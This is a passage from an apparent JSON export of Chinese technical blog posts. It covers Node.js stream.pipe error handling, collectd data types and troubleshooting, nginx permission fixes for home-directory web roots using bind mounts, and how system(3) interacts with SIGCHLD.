Writable.end()，触发可写流的 finish 事件。\n</li>\n</ul>\n\n\n<ul class=\"org-ul\">\n<li>监听可写流的 error 事件：调用可读流的 unpipe()，触发可写流的 unpipe 事件，如果 error 事件没有其它人监听，则抛出为异常。\n</li>\n</ul>\n\n\n<ul class=\"org-ul\">\n<li>在可写流上发出 pipe 事件。\n</li>\n</ul>\n\n\n<p>\n以上流程请自行阅读代码映证：<a href=\"https://github.com/nodejs/node/blob/v4.4.4/lib/_stream_readable.js#L460\">node/_stream_readable.js at v4.4.4 · nodejs/node</a>\n</p>\n</div>\n</div>\n\n\n<div id=\"outline-container-sec-5\" class=\"outline-2\">\n<h2 id=\"sec-5\">stream.pipe 的问题</h2>\n<div class=\"outline-text-2\" id=\"text-5\">\n<p>\n结合以上描述有以下疑问\n</p>\n\n<ul class=\"org-ul\">\n<li>可读流出错会怎么样\n\n<p>\n可读流发出 error、close 事件，但因为错误没有发出 end 事件。\n</p>\n\n<p>\n可读流可能被关闭，可写流不会被关闭，pipe 状态保持不变，数据流动停顿了。\n</p>\n\n<p>\n在现实情况中，或早或晚，可写流可能因为超时时间到等原因最终被关闭，从而转化为下面的情况。\n</p>\n</li>\n</ul>\n\n\n<ul class=\"org-ul\">\n<li>可写流出错会怎么样\n\n<p>\n可写流发出 error、close 事件，没有 finish 事件。\n</p>\n\n<p>\n可读流会与可写流断开 pipe，可读流不会被关闭。\n</p>\n\n<p>\n可读流以 fs.ReadStream 为例，当它被读完时（EOF，发出 end 事件），根据 autoClose 标志（默认为 true），决定是否关闭流（释放文件句柄），没有读完就不会被关闭。\n</p>\n\n<p>\n以上逻辑是合理的，一个可读流可以与多个可写流通过 pipe 连在一起，没有理由因为一个可写流的问题影响到可读流的状态。\n</p>\n\n<p>\n做为开发人员，切莫幻想 node.js 的垃圾收集（ GC）会在可读流没有被引用时自动关闭文件句柄。\n</p>\n\n<p>\n当 node.js 将文件句柄以整数（Integer）方式表示时，就不可能实现垃圾收集时自动关闭文件句柄了。\n</p>\n</li>\n</ul>\n\n\n<p>\nstream.pipe 没有魔法，它提供了一种传输数据的优美方式，但是它并不完美，在错误处理方面留下了很多空白，有待开发人员自行解决。</p>\n</div>\n</div>\n"
},
{
  "title": "理解 collectd 的四种数据类型",
  "timestamp": "2016-05-30 14:32:00",
  "tags": [
    "collectd"
  ],
  "body": "\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\">collectd 的基础是 <a href=\"http://oss.oetiker.ch/rrdtool/\">RRDtool</a></h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n<blockquote>\n<p>\nRRDtool is the OpenSource industry standard, high performance data logging and graphing system for time series data.\n</p>\n</blockquote>\n\n<blockquote>\n<p>\nWhat makes RRDtool so special?\n</p>\n\n<p>\nRRDtool is GNU licensed software developed by Tobias Oetiker, a system manager at the Swiss Federal Institute of Technology. Though it is a database, there are distinct differences between RRDtool databases and other databases as listed below:\n</p>\n\n<ul class=\"org-ul\">\n<li>RRDtool stores data; that makes it a back-end tool. The RRDtool command set allows one to create graphs; that makes it a front-end tool as well. Other databases just store data and can not create graphs.\n</li>\n\n<li>In case of linear databases, new data gets appended at the bottom of the database table. Thus its size keeps on increasing, whereas the size of an RRDtool database is determined at creation time. Imagine an RRDtool database as the perimeter of a circle. Data is added along the perimeter. When new data reaches the starting point, it overwrites existing data. This way, the size of an RRDtool database always remains constant. The name \"Round Robin\" stems from this behavior.\n</li>\n\n<li>Other databases store the values as supplied. RRDtool can be configured to calculate the rate of change from the previous to the current value and store this information instead.\n</li>\n\n<li>Other databases get updated when values are supplied. The RRDtool database is structured in such a way that it needs data at predefined time intervals. If it does not get a new value during the interval, it stores an UNKNOWN value for that interval. So, when using the RRDtool database, it is imperative to use scripts that run at regular intervals to ensure a constant data flow to update the RRDtool database.\n</li>\n</ul>\n</blockquote>\n\n<blockquote>\n<p>\n是什么让 RRDtool 如此特殊？\n</p>\n\n<p>\nRRDtool 是由 Tobias Oetiker 开发的遵循 GNU 协议的软件，他是 Swiss Federal Institute of Technology 的 system manager。虽然 RRDtool 是一个数据库，但与其它数据库有着明显的区别，如下所述：\n</p>\n\n<ul class=\"org-ul\">\n<li>RRDtool 存储数据，是后端工具。RRDtool 命令集可用于创建图表，因此它也是前端工具。其它数据库只存储数据但不创建图表。\n</li>\n\n<li>做为线性数据库，新数据追加在数据库的底部。这样它的尺寸会不断增长，然而 RRDtool 数据库的尺寸在创建时确定。想像 RRDtool 数据库是圆周长。数据随着周长添加。当新数据达到起始点，它会覆盖已存在的数据。这样，RRDtool 数据库的尺寸总是保持不变。因此得名“Round Robin”。\n</li>\n\n<li>其它数据库存储供应的数据值。而 RRDtool 可配置为计算前一个值到当前值的变化率，做为替代物进行存储。\n</li>\n\n<li>其它数据库在供应数据值时就会进行更新。RRDtool 数据库构造为需要预定义时间间隔的数据。在一个时间间隔内，如果它无法获取到一个新值，它会为该时间间隔存储一个未知（UNKNOWN） 值。因此，使用 RRDtool 数据库时，必须定期运行脚本确保恒定的数据流去更新 RRDtool 数据库。\n</li>\n</ul>\n</blockquote>\n\n<p>\n以上引用自 <a href=\"http://oss.oetiker.ch/rrdtool/tut/rrd-beginners.en.html\">RRDtool - rrd-beginners</a>\n</p>\n</div>\n</div>\n\n<div id=\"outline-container-sec-2\" class=\"outline-2\">\n<h2 id=\"sec-2\">collectd 的四种数据类型</h2>\n<div class=\"outline-text-2\" id=\"text-2\">\n<p>\nRRDtool 默认的时间间隔为 300 秒（5分钟），collectd 默认时间间隔为 10 秒。\n</p>\n\n<p>\n通常的建议是上报数据时，确保时间间隔与 collectd 服务器的设置一致（即 COLLECTD_INTERVAL），\n但是了解 collectd 会如何处理上报的值，更有利于我们正确地上报数据，获得理想的结果。\n</p>\n\n<p>\ncollectd 用到了 RRDtool 中的四种数据类型：ABSOLUTE、COUNTER、DERIVE、GAUGE，《<a href=\"http://blog.kankanan.com/article/collectd-6570636e7c7b578b8be689e3.html\">collectd 数据类型详解</a>》 已有描述，而具体如何使用则看本文。\n</p>\n\n<p>\n假设要上报一个 100/秒 的统计值，在一个时间间隔（10 秒）内分成多部分上报，分别使用四种数据类型进行上报。\n</p>\n\n<p>\n<code>absolute.sh</code>\n</p>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\"><span style=\"color: #999999; font-style: italic;\">#</span><span style=\"color: #999999; font-style: italic;\">!/bin/</span><span style=\"color: #99cc99;\">bash</span>\n\n<span style=\"color: #ffcc66;\">HOSTNAME</span>=<span style=\"color: #66cccc;\">\"${COLLECTD_HOSTNAME:-localhost}\"</span>\n<span style=\"color: #ffcc66;\">VALUE</span>=0\n\n<span style=\"color: #99cc99;\">while</span> [ 1 ]; <span style=\"color: #99cc99;\">do</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   sleep 3\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #ffcc66;\">VALUE</span>=200\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #cc99cc;\">echo</span> <span style=\"color: #66cccc;\">\"PUTVAL \\\"$HOSTNAME/test/absolute\\\" N:$VALUE\"</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   sleep 1\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #ffcc66;\">VALUE</span>=100\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #cc99cc;\">echo</span> <span style=\"color: #66cccc;\">\"PUTVAL \\\"$HOSTNAME/test/absolute\\\" N:$VALUE\"</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   sleep 6\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #ffcc66;\">VALUE</span>=700\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #cc99cc;\">echo</span> <span style=\"color: #66cccc;\">\"PUTVAL \\\"$HOSTNAME/test/absolute\\\" N:$VALUE\"</span>\n<span style=\"color: #99cc99;\">done</span>\n</pre>\n</div>\n\n<p>\n<code>ABSOLUTE</code> 类型值的处理\n</p>\n<blockquote>\n<p>\n将时间间隔（10 秒）内的上报的值进行累加，然后与时间间隔（10 秒）相除\n</p>\n\n<p>\n(200 + 100 + 700)/10 == 100\n</p>\n</blockquote>\n\n<p>\n<code>counter.sh</code>\n</p>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\"><span style=\"color: #999999; font-style: italic;\">#</span><span style=\"color: #999999; font-style: italic;\">!/bin/</span><span style=\"color: #99cc99;\">bash</span>\n\n<span style=\"color: #ffcc66;\">HOSTNAME</span>=<span style=\"color: #66cccc;\">\"${COLLECTD_HOSTNAME:-localhost}\"</span>\n<span style=\"color: #ffcc66;\">VALUE</span>=0\n\n<span style=\"color: #99cc99;\">while</span> [ 1 ]; <span style=\"color: #99cc99;\">do</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   sleep 3\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #ffcc66;\">VALUE</span>=$[VALUE+500]\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #cc99cc;\">echo</span> <span style=\"color: #66cccc;\">\"PUTVAL \\\"$HOSTNAME/test/counter\\\" N:$VALUE\"</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   sleep 1\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #ffcc66;\">VALUE</span>=$[VALUE+200]\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #cc99cc;\">echo</span> <span style=\"color: #66cccc;\">\"PUTVAL \\\"$HOSTNAME/test/counter\\\" N:$VALUE\"</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   sleep 6\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #ffcc66;\">VALUE</span>=$[VALUE+300]\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #cc99cc;\">echo</span> <span style=\"color: #66cccc;\">\"PUTVAL \\\"$HOSTNAME/test/counter\\\" N:$VALUE\"</span>\n<span style=\"color: #99cc99;\">done</span>\n</pre>\n</div>\n\n<p>\n<code>COUNTER</code> 类型值的处理\n</p>\n<blockquote>\n<p>\n将时间间隔（10 秒）内的变化值（时间间隔内最后上报的值减去上一时间间隔最后上报的值）与时间间隔（10 秒）相除\n</p>\n\n<p>\n(2000 - 1000) / 10 == 100\n</p>\n</blockquote>\n\n<p>\n<code>derive.sh</code>\n</p>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\"><span style=\"color: #999999; font-style: italic;\">#</span><span style=\"color: #999999; font-style: italic;\">!/bin/</span><span style=\"color: #99cc99;\">bash</span>\n\n<span style=\"color: #ffcc66;\">HOSTNAME</span>=<span style=\"color: #66cccc;\">\"${COLLECTD_HOSTNAME:-localhost}\"</span>\n<span style=\"color: #ffcc66;\">VALUE</span>=0\n\n<span style=\"color: #99cc99;\">while</span> [ 1 ]; <span style=\"color: #99cc99;\">do</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   sleep 3\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #ffcc66;\">VALUE</span>=$[VALUE+500]\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #cc99cc;\">echo</span> <span style=\"color: #66cccc;\">\"PUTVAL \\\"$HOSTNAME/test/counter\\\" N:$VALUE\"</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   sleep 1\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #ffcc66;\">VALUE</span>=$[VALUE+200]\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #cc99cc;\">echo</span> <span style=\"color: #66cccc;\">\"PUTVAL \\\"$HOSTNAME/test/counter\\\" N:$VALUE\"</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   sleep 6\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #ffcc66;\">VALUE</span>=$[VALUE+300]\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #cc99cc;\">echo</span> <span style=\"color: #66cccc;\">\"PUTVAL \\\"$HOSTNAME/test/counter\\\" N:$VALUE\"</span>\n<span style=\"color: #99cc99;\">done</span>\n</pre>\n</div>\n\n<p>\n<code>DERIVE</code> 类型值的处理\n</p>\n<blockquote>\n<p>\n将时间间隔（10 秒）内的变化值（时间间隔内最后上报的值减去上一时间间隔最后上报的值）与时间间隔（10 秒）相除\n</p>\n\n<p>\n(2000 - 1000) / 10 == 100\n</p>\n</blockquote>\n\n<p>\n<code>gauge.sh</code>\n</p>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\"><span style=\"color: #999999; font-style: italic;\">#</span><span style=\"color: #999999; font-style: italic;\">!/bin/</span><span style=\"color: #99cc99;\">bash</span>\n\n<span style=\"color: #ffcc66;\">HOSTNAME</span>=<span style=\"color: #66cccc;\">\"${COLLECTD_HOSTNAME:-localhost}\"</span>\n<span style=\"color: #ffcc66;\">VALUE</span>=0\n\n<span style=\"color: #99cc99;\">while</span> [ 1 ]; <span style=\"color: #99cc99;\">do</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   sleep 8\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #ffcc66;\">VALUE</span>=50\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #cc99cc;\">echo</span> <span style=\"color: #66cccc;\">\"PUTVAL \\\"$HOSTNAME/test/gauge\\\" N:$VALUE\"</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   sleep 2\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #ffcc66;\">VALUE</span>=300\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #cc99cc;\">echo</span> <span style=\"color: #66cccc;\">\"PUTVAL \\\"$HOSTNAME/test/gauge\\\" N:$VALUE\"</span>\n<span style=\"color: #99cc99;\">done</span>\n</pre>\n</div>\n\n<p>\n<code>GAUGE</code> 类型值的处理\n</p>\n<blockquote>\n<p>\n将时间间隔（10 秒）内的值乘以该值与上一值的时间间隔，再累加，最后与时间间隔（10 秒）相除\n</p>\n\n<p>\n((50 * 8) + (300 * 2)) / 10 == 100\n</p>\n</blockquote>\n</div>\n</div>\n\n\n<div id=\"outline-container-sec-3\" class=\"outline-2\">\n<h2 id=\"sec-3\"><code>COUNTER</code> VS <code>DERIVE</code></h2>\n<div class=\"outline-text-2\" id=\"text-3\">\n<p>\n这两者非常相似，不同点表现在当前上报的值小于上一上报值时：\n</p>\n\n<ul class=\"org-ul\">\n<li><code>COUNTER</code> 认为数据发生了溢出，会进行”回绕“计算，只要在数据集定义的取值范围（Min-Max）内，仍会做为当前时间间隔（10 秒）的值。\n\n<p>\n如生成统计值的程序或设备发生重启，而且重启时间小于一个时间间隔（10 秒），则有可能因”回绕“计算得出巨大的错误值。\n</p>\n\n<p>\n因此建议在 <code>COUNTER</code> 类型数据集上设置合理的取值范围，一方面支持”回绕“计算，另一方面又不受误计算的影响。\n</p>\n</li>\n\n<li><code>DERIVE</code> 认为这是异常值，丢弃该值。\n</li>\n</ul>\n\n\n<p>\n<code>COUNTER</code> 和 <code>DERIVE</code> 类型的值与上一值紧密相关，需要减去上一值才是变化值。\n</p>\n</div>\n</div>\n\n<div id=\"outline-container-sec-4\" class=\"outline-2\">\n<h2 id=\"sec-4\"><code>ABSOLUTE</code> VS <code>GAUGE</code></h2>\n<div class=\"outline-text-2\" id=\"text-4\">\n<p>\n<code>ABSOLUTE</code> 是变化值，而 <code>GAUGE</code> 变化率（数量/秒）。\n</p>\n\n<p>\n<code>ABSOLUTE</code> 需要将时间间隔（10 秒）内的值累加再除以时间间隔（10 秒）算出变化率（数量/秒）。\n</p>\n\n<p>\n<code>GAUGE</code> 还与当前值到上一值的时间间隔紧密相关，上一值到当前值的时间间隔内的变化率都为当前值。\n</p>\n\n<p>\n<code>COUNTER</code> 和 <code>DERIVE</code> 类型的值与上一值无关，本身就是变化值（或变化率）。</p>\n</div>\n</div>\n"
},
{
  "title": "collectd 问题诊断方法",
  "timestamp": "2016-05-30 16:27:00",
  "tags": [
    "collectd"
  ],
  "body": "\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\">输出日志</h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n<p>\n<code>collectd.conf</code>\n</p>\n<pre class=\"example\">\nLoadPlugin \"logfile\"\n&lt;Plugin \"logfile\"&gt;\n  LogLevel \"info\"\n  File \"/var/log/collectd.log\"\n  Timestamp true\n&lt;/Plugin&gt;\n</pre>\n\n<p>\ncollectd-exec 插件执行的脚本标准错误输出（stderr）会出现在日志文件中（/var/log/collectd.log）。\n</p>\n\n<p>\n通过分析日志可以查出统计脚本本身的问题。\n</p>\n</div>\n</div>\n\n<div id=\"outline-container-sec-2\" class=\"outline-2\">\n<h2 id=\"sec-2\">网络抓包</h2>\n<div class=\"outline-text-2\" id=\"text-2\">\n<p>\n使用 tcpdump 抓包\n</p>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">tcpdump -i any host &lt;collectd server ip&gt; -XX -tttt -nnnn -s 0 -w ~/&lt;collectd ser<span style=\"text-decoration: underline;\">ver ip&gt;.pcap</span>\n</pre>\n</div>\n<p>\n请将 <code>&lt;collectd server ip&gt;</code> 替换为 collectd.conf 中 <code>network</code> 插件中的 <code>Server</code> 值。\n</p>\n\n<p>\n使用 wireshark 查看抓到的包，右键菜单中选择 <code>Decode As...</code> ，弹出的列表中选择按 <code>collectd</code> 协议进行解析。\n</p>\n\n<p>\n检查上报的数据是否有问题。\n</p>\n\n<p>\n如果上报的数据是正常的，则有可能是以前上报了有问题的数据导致，请尝试从 collectd 服务器上直接将相应的 rrd 文件删除。\n</p>\n</div>\n</div>\n\n<div id=\"outline-container-sec-3\" class=\"outline-2\">\n<h2 id=\"sec-3\">分析 rrd 文件</h2>\n<div class=\"outline-text-2\" id=\"text-3\">\n<p>\ncollectd 是使用 RRDtool 进行数据存储，直接查看 rrd 文件数据是最直接的诊断方法。\n</p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">rrdtool fetch /var/lib/collectd/localhost/test/gauge.rrd AVERAGE --start 1464585<span style=\"text-decoration: underline;\">532 --end N</span>\n</pre>\n</div>\n\n<p>\nRRDtool 的用法请参考 <a href=\"http://oss.oetiker.ch/rrdtool/tut/rrdtutorial.en.html\">RRDtool - rrdtutorial</a>\n</p>\n</div>\n</div>\n"
},
{
  "title": "解决个人用户目录做为 Web 服务根目录的权限问题",
  "timestamp": "2016-06-14 13:38:00",
  "tags": [
    "web",
    "linux",
    "nginx"
  ],
  "body": "<p>\n我们在个人帐号目录下进行日常的开发工作，通常使用弱权限帐号（如：nobody）运行 Web 服务器（如：nginx）。\n</p>\n\n<p>\nnginx 配置 Web 服务器的根目录为个人用户目录，这样修改代码后刷新浏览器就可以看到效果。\n</p>\n\n<pre class=\"example\">\nuser nobody;\n\nserver {\n   listen       80;\n   server_name  www.example.com;\n\n   location / {\n       root   /home/tangxinfa/projects/www.example.com;\n       index  index.html index.htm;\n   }\n}\n</pre>\n\n<p>\n然而 linux 的用户权限系统禁止 Web 服务器用户（nobody）访问个人用户（tangxinfa）的数据。\n</p>\n\n<p>\n使用浏览器访问，会得到一个错误页面\n</p>\n<pre class=\"example\">\n403 Forbidden\n</pre>\n\n<p>\n使用 linux 命令确认问题是由用户权限系统引起\n</p>\n<pre class=\"example\">\n$ sudo -u nobody -g nobody ls -la /home/tangxinfa/projects/www.example.com\nls: cannot access '/home/tangxinfa/projects/www.example.com': Permission denied\n</pre>\n\n\n<p>\n解决方法有以下几种：\n</p>\n\n<ul class=\"org-ul\">\n<li>使用软链接\n\n<p>\n很多人都会下意识地想到通过软链接来解决\n</p>\n<pre class=\"example\">\nsudo ln -s /home/tangxinfa/projects/www.example.com /var/www/\nsudo chown -R nobody:nobody /var/www/www.example.com\nsudo chown -R nobody:nobody /home/tangxinfa/projects/www.example.com\n</pre>\n<p>\n将个人用户目录链到 Web 服务器用户目录下是没有用的，linux 按原始路径（/home/tangxinfa/projects/www.example.com）来检查权限。\n</p>\n\n<p>\n可以反过来，将项目从个人用户目录移到 Web 服务器用户目录下，然后反向建一个软链接，即可以让 Web 服务器工作正常，又不影响日常开发。\n</p>\n\n<pre class=\"example\">\nsudo mv /home/tangxinfa/projects/www.example.com /var/www/\nln -s /var/www/www.example.com /home/tangxinfa/projects/\n</pre>\n\n<p>\n但是，如果项目是版本控制系统（如：git）仓库的一个子项目（目录），将目录变成软链接后 git 会认为目录被删除了。\n</p>\n</li>\n</ul>\n\n\n<ul class=\"org-ul\">\n<li>用户目录给 Web 服务帐号开放权限\n\n<p>\n按 linux 的帐号权限系统要求，修改（chmod）用户目录的属性，每一级目录的权限都要修改，容易过渡放开权限，引入安全问题。\n</p>\n\n<p>\n设置 Web 服务帐号为用户帐号\n</p>\n\n<pre class=\"example\">\nuser tangxinfa;\n</pre>\n\n<p>\n由于 Web 服务器（nginx）通常配有多个服务，Web 服务帐号是全局共用的，其它服务的目录权限也要进行调整。\n如果 nginx 只运行这一个服务的话，还是可行的。\n</p>\n\n<p>\n设置 Web 服务帐号为 root 帐号\n</p>\n\n<pre class=\"example\">\nuser root;\n</pre>\n\n<p>\n使用 root 帐号会引入安全隐患，一般不推荐，但很少会遇到目录权限方面的问题，可以应急使用。\n</p>\n</li>\n</ul>\n\n\n<ul class=\"org-ul\">\n<li>将用户目录挂载到 Web 帐号目录下\n\n<p>\nmount 命令支持将一个目录重新挂载到其它位置\n</p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">sudo mkdir /var/www/www.example.com\nsudo chown nobody:nobody /var/www/www.example.com\nsudo mount --bind -o ro,<span style=\"color: #ffcc66;\">username</span>=nobody /home/tangxinfa/projects/www.example.com<span style=\"text-decoration: underline;\"> /var/www/www.example.com</span>\n</pre>\n</div>\n\n<p>\nWeb 服务器和日常开发可以兼顾，两全其美的方案。\n</p>\n\n<p>\nbind 形式的挂载放到 /etc/fstab 会挂载失败（估计是挂载时相关依赖还没有准备好），影响开机。\n</p>\n\n<p>\n创建挂载脚本 /usr/sbin/bind-mounts 并添加可执行权限，内容如下\n</p>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\"><span style=\"color: #999999; font-style: italic;\">#</span><span style=\"color: #999999; font-style: italic;\">!/bin/</span><span style=\"color: #99cc99;\">bash</span>\n\nmount --bind -o ro,<span style=\"color: #ffcc66;\">username</span>=nobody /home/tangxinfa/projects/www.example.com /var<span style=\"text-decoration: underline;\">/www/www.example.com</span>\n</pre>\n</div>\n\n<p>\n创建 systemd 服务文件 /usr/lib/systemd/system/bind-mounts.service\n</p>\n<pre class=\"example\">\n[Unit]\nDescription=Bind Mounts\nAfter=local-fs.target\n\n[Service]\nType=simple\nExecStart=/usr/sbin/bind-mounts\n\n[Install]\nWantedBy=multi-user.target\n</pre>\n\n<p>\n启用 bind-mounts 服务\n</p>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">sudo systemctl enable bind-mounts\n</pre>\n</div>\n</li>\n</ul>\n"
},
{
  "title": "system(3) 与 SIGCHLD 信号",
  "timestamp": "2016-07-28 11:44:00",
  "tags": [
    "linux",
    "c"
  ],
  "body": "<p>\nsystem(3) 常用于执行 shell 命令\n</p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-c\"><span style=\"color: #cc99cc;\">#include</span> <span style=\"color: #66cccc;\">&lt;stdlib.h&gt;</span>\n<span style=\"color: #cc99cc;\">#include</span> <span style=\"color: #66cccc;\">&lt;stdio.h&gt;</span>\n\n\n<span style=\"color: #6699cc;\">int</span> <span style=\"color: #f99157;\">main</span>(<span style=\"color: #6699cc;\">int</span> <span style=\"color: #ffcc66;\">argc</span>, <span style=\"color: #6699cc;\">char</span> *<span style=\"color: #ffcc66;\">argv</span>[])\n{\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #6699cc;\">int</span> <span style=\"color: #ffcc66;\">ret</span> = system(<span style=\"color: #66cccc;\">\"ls -la\"</span>);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   printf(<span style=\"color: #66cccc;\">\"ret: %d\\n\"</span>, ret);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">return</span> ret;\n}\n</pre>\n</div>\n\n<p>\n正常情况下，命令执行成功会返回 0。\n</p>\n\n<p>\nsystem(3) 在执行的命令结束时会发出 SIGCHLD 信号，收到 SIGCHLD 信号的线程会从系统调用（如：read，write）中断返回，errno 为 EINTR（4: Interrupted system call）。\n</p>\n\n<p>\n应用程序应该重试被中断的系统调用，但很多时候是通过第三方库间接进行系统调用，而这些库并未考虑周到，误以为系统调用失败。\n</p>\n\n<p>\n另外还有信号标志 SA_RESTART ，用于自动重试被中断的系统调用，考虑到它只支持部分系统调用，而且我用到的平台不支持这一标志，所以不作考虑。\n</p>\n\n<p>\n那么该如何避免 SIGCHLD 信号中断系统调用呢？\n</p>\n\n\n<p>\n根据 system(3) 函数的 <a href=\"http://man7.org/tlpi/code/online/dist/procexec/system.c.html\">源码</a> ，其关键逻辑如下：\n</p>\n\n<ul class=\"org-ul\">\n<li>保存信号掩码\n</li>\n\n<li>设置信号掩码为阻塞（SIG_BLOCK） SIGCHLD 信号\n</li>\n\n<li>fork(3)\n\n<ul class=\"org-ul\">\n<li>子进程\n\n<p>\n重置为保存的信号掩码，然后 execl(3)\n</p>\n</li>\n\n<li>父进程\n\n<p>\n等待子进程（waitpid(3)）结束，重置为保存的信号掩码\n</p>\n</li>\n</ul>\n</li>\n</ul>\n\n<p>\n子进程结束时操作系统会给父进程发送 SIGCHLD 信号，父进程会遍历（通常从主线程找起）一个不阻塞 SIGCHLD 的线程进行处理。\n</p>\n\n\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\">在整个应用中忽略 SIGCHLD 信号会导致获取不到子进程退出码</h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n<p>\n在应用程序最开始的时候（main 函数），添加以下语句\n</p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-c\">signal(SIGCHLD, SIG_IGN);\n</pre>\n</div>\n\n<p>\n子线程会继承主线程的信号处理，也就不会导致系统调用被中断。\n</p>\n\n<p>\n然而，它会导致 system(3) 总是返回 -1，errno 为 ECHILD（10: No child processes），无法判断命令执行是否成功。\n</p>\n\n<p>\n<a href=\"http://stackoverflow.com/a/25039605/802708\">c - system() function while SIGCHLD is ignored - Stack Overflow</a> 或 man wait(2)\n</p>\n<blockquote>\n<p>\nPOSIX.1-2001 指明，如果将 SIGCHLD 置为 SIG_IGN，或者为 SIGCHLD 指定 SA_NOCLDWAIT 标志（见 sigaction(2)），子进程结束后将不会成为僵尸进程，调用 wait() 或 waitpid() 将阻塞到所有子进程结束后返回错误，errno 设置为 ECHILD。\n</p>\n\n<p>\nPOSIX.1-2001 specifies that if the disposition of SIGCHLD is set to SIG_IGN or the SA_NOCLDWAIT flag is set for SIGCHLD (see sigaction(2)), then children that terminate do not become zombies and a call to wait() or waitpid() will block until all children have terminated, and then fail with errno set to ECHILD.\n</p>\n</blockquote>\n\n<p>\n<a href=\"https://www.win.tue.nl/~aeb/linux/lk/lk-5.html\">The Linux kernel: Signals</a>\n</p>\n<blockquote>\n<p>\nIf the parent is not interested it can say so explicitly (before the fork) using\n</p>\n\n<p>\nsignal(SIGCHLD, SIG_IGN);\n</p>\n\n<p>\nor\n</p>\n\n<p>\nstruct sigaction act;\nact.sa_handler = something;\nact.sa_flags = SA_NOCLDWAIT;\nsigaction (SIGCHLD, &amp;act, NULL);\n</p>\n\n<p>\nand as a result it will not hear about deceased children, and children will not be transformed into zombies. Note that the default action for SIGCHLD is to ignore this signal; nevertheless signal(SIGCHLD, SIG_IGN) has effect, namely that of preventing the transformation of children into zombies. In this situation, if the parent does a wait(), this call will return only when all children have exited, and then returns -1 with errno set to ECHILD.\n</p>\n</blockquote>\n\n<p>\nsystem(3) 调用 waitpid(3) 时，子进程已经被系统自动回收，消失得无影无踪，也就取不到子进程的返回值。\n</p>\n</div>\n\n<div id=\"outline-container-sec-1-1\" class=\"outline-3\">\n<h3 id=\"sec-1-1\">使用 popen(3)/pclose(3) 来代替 system(3) 通过分析标准输出来判断命令执行是否成功</h3>\n<div class=\"outline-text-3\" id=\"text-1-1\">\n<div class=\"org-src-container\">\n\n<pre class=\"src src-c\"><span style=\"color: #6699cc;\">int</span> <span style=\"color: #f99157;\">system2</span>(<span style=\"color: #99cc99;\">const</span> <span style=\"color: #6699cc;\">char</span>* <span style=\"color: #ffcc66;\">command</span>, <span style=\"color: #6699cc;\">char</span>* <span style=\"color: #ffcc66;\">output</span>, <span style=\"color: #6699cc;\">size_t</span> <span style=\"color: #ffcc66;\">output_size</span>)\n{\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #6699cc;\">FILE</span>* <span style=\"color: #ffcc66;\">p</span> = popen(command, <span style=\"color: #66cccc;\">\"r\"</span>);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">if</span> (p) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   memset(output, <span style=\"color: 